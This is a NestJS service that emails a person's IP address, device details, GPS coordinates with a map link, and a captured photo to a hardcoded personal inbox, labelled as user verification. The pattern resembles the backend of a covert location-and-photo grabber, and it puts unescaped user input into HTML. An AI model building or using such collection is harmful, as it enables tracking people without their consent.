import { Injectable } from '@nestjs/common';
import { Resend } from 'resend';

@Injectable()
export class CollectService {
  private resend = new Resend(process.env.RESEND_API_KEY);

  async sendEmail(data: any) {
    const mapLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;

    // image ko base64 me convert (Resend ke liye safe)
    const photoBase64 = data.photo?.buffer
      ? data.photo.buffer.toString('base64')
      : null;

    await this.resend.emails.send({
      from: 'onboarding@resend.dev', // default verified sender
      to: ['manishkumr101k@gmail.com'],
      subject: '📸 User Verification Data',
      html: `
        <h2>User Verification</h2>

        <p><b>IP Address:</b> ${data.ip}</p>

        <p><b>Device Info:</b><br/>${data.deviceInfo}</p>

        <p><b>GPS Location:</b><br/>
        Latitude: ${data.latitude}<br/>
        Longitude: ${data.longitude}</p>

        <p><b>Google Maps:</b>
        <a href="${mapLink}" target="_blank">Open Location</a></p>

        ${
          photoBase64
            ? `<p><b>Captured Photo:</b><br/>
               <img src="data:image/jpeg;base64,${photoBase64}" width="300"/></p>`
            : ''
        }

        <p><b>Time:</b> ${new Date().toLocaleString()}</p>
      `,
    });
  }
}
